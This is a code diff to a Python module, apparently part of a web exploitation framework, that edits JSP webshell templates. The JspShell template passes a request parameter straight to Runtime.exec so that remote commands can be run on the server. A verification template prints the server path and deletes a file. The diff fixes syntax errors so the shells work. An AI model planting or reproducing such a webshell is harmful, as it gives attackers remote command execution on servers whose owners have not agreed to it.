@@ -89,10 +89,12 @@ class AspxVerify(VerifyShell):
 
 
 class JspShell(Webshell):
-    _content = '<%@ page import="java.util.*,java.io.*"%>\n' \
+    _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
+               '<%@ page import="java.io.*"%>\n' \
+               '<%@ page import="java.util.*"%>\n' \
                '<%\n' \
                'if (request.getParameter("check") == "1")\n' \
-               '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");\n' \
+               '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));\n' \
                'if (request.getParameter("{0}") != null)\n' \
                '{\n' \
                '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
@@ -115,6 +117,7 @@ class JspShell(Webshell):
 class JspVeriry(VerifyShell):
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
                '<%@ page import="java.io.*"%>\n' \
+               '<%@ page import="java.util.*"%>\n' \
                '<%\n' \
                'String path=request.getRealPath("");\n' \
                'out.println(path);\n' \
@@ -123,7 +126,7 @@ class JspVeriry(VerifyShell):
                '  d.delete();\n' \
                '  }\n' \
                '%>\n' \
-               '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");%>'
+               '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));%>'
     _keyword = '202cb962ac59075b964b07152d234b70'
 
 
